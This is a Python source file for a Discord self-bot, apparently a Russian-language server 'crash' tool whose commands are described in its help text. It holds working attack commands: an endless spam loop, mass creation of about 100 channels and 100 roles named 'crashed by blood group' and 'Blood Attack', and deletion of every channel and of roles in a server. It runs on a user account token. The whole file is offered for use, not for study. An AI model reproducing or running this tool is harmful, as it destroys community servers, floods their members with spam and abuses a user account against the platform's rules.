import discord
from discord.ext import commands

client = commands.Bot(command_prefix = '!', self_bot = True)
client.remove_command('help')
spam_message = 'you spam message' #enter you spam text

@client.event
async def on_ready():
    print('All work')


@client.command()
async def s(ctx, *, text):
    await ctx.message.delete()
    await ctx.send(embed = discord.Embed(description = text))

@client.command()
async def spam(ctx):
    while True:
        await ctx.send(spam_message)

@client.command()
async def channels(ctx):
    for i in range(1,100):
        await ctx.guild.create_text_channel('crashed by blood group')
    for i in range(1,100):
        await ctx.guild.create_voice_channel('Crashed By Blood Group')

@client.command()
async def channel(ctx):
    for channel in ctx.guild.channels:
        await channel.delete()

@client.command()
async def role(ctx):
    roles = ctx.guild.roles
    roles.pop(0)

    for role in roles:
        if ctx.guild.me.roles[-1] > role:
            await role.delete()

@client.command()
async def roles(ctx):
    for i in range(1,100):
        await ctx.guild.create_role(name = 'Blood Attack')
        role = discord.utils.get(ctx.guild.roles, name = "Blood Attack")



@client.command()
async def help(ctx):
    embed = discord.Embed(
        title = 'Команды',
        description = '''**Спам команды**\n!s - сказать что нибудь от лица бота.\n!spam - начать массовый спам.\n**Краш команды**\n!channels - спам каналами.\n!channel - удалить каналы.\n!roles - спам ролями.\n!role - удалить роли.\n**Информация**\n!info - информация о юзере.\n[**🔗Support Server**](https://discord.gg/rEqrEpF8xA)\n[Made wotch by GitHub: https://github.com/Biohazard-python](https://github.com/Biohazard-python)''',
    )
    embed.set_image(url='https://cdn.discordapp.com/attachments/820182533861408799/823601330492538880/180px-D092D181D0B5D180D0BED181D181D0B8D0B9D181D0BAD0B0D18F_D184D0B0D188D0B8D181D182D181D0BAD0B0D18F_.png') #image for embed
    await ctx.send(embed=embed)

@client.command()
async def avatar(ctx):
    await ctx.send(member.avatar_url)

@client.command()
async def info(ctx,member:discord.Member = None, guild: discord.Guild = None):
    await ctx.message.delete()
    if member == None:
        emb = discord.Embed(title="Информация о пользователе", color=ctx.message.author.color)
        emb.add_field(name="Имя:", value=ctx.message.author.display_name,inline=False)
        emb.add_field(name="Айди пользователя:", value=ctx.message.author.id,inline=False)
        t = ctx.message.author.status
        if t == discord.Status.online:
            d = " В сети"

        t = ctx.message.author.status
        if t == discord.Status.offline:
            d = "⚪ Не в сети"

        t = ctx.message.author.status
        if t == discord.Status.idle:
            d = " Не активен"

        t = ctx.message.author.status
        if t == discord.Status.dnd:
            d = " Не беспокоить"

        emb.add_field(name="Активность:", value=d,inline=False)
        emb.add_field(name="Статус:", value=ctx.message.author.activity,inline=False)
        emb.add_field(name="Роль на сервере:", value=f"{ctx.message.author.top_role.mention}",inline=False)
        emb.add_field(name="Акаунт был создан:", value=ctx.message.author.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"),inline=False)
        emb.set_thumbnail(url=ctx.message.author.avatar_url)
        await ctx.send(embed = emb)
    else:
        emb = discord.Embed(title="Информация о пользователе", color=member.color)
        emb.add_field(name="Имя:", value=member.display_name,inline=False)
        emb.add_field(name="Айди пользователя:", value=member.id,inline=False)
        t = member.status
        if t == discord.Status.online:
            d = " В сети"

        t = member.status
        if t == discord.Status.offline:
            d = "⚪ Не в сети"

        t = member.status
        if t == discord.Status.idle:
            d = " Не активен"

        t = member.status
        if t == discord.Status.dnd:
            d = " Не беспокоить"
        emb.add_field(name="Активность:", value=d,inline=False)
        emb.add_field(name="Статус:", value=member.activity,inline=False)
        emb.add_field(name="Роль на сервере:", value=f"{member.top_role.mention}",inline=False)
        emb.add_field(name="Акаунт был создан:", value=member.created_at.strftime("%a, %#d %B %Y, %I:%M %p UTC"),inline=False)
        await ctx.send(embed = emb)


client.run("token you account", bot = False) #You token account
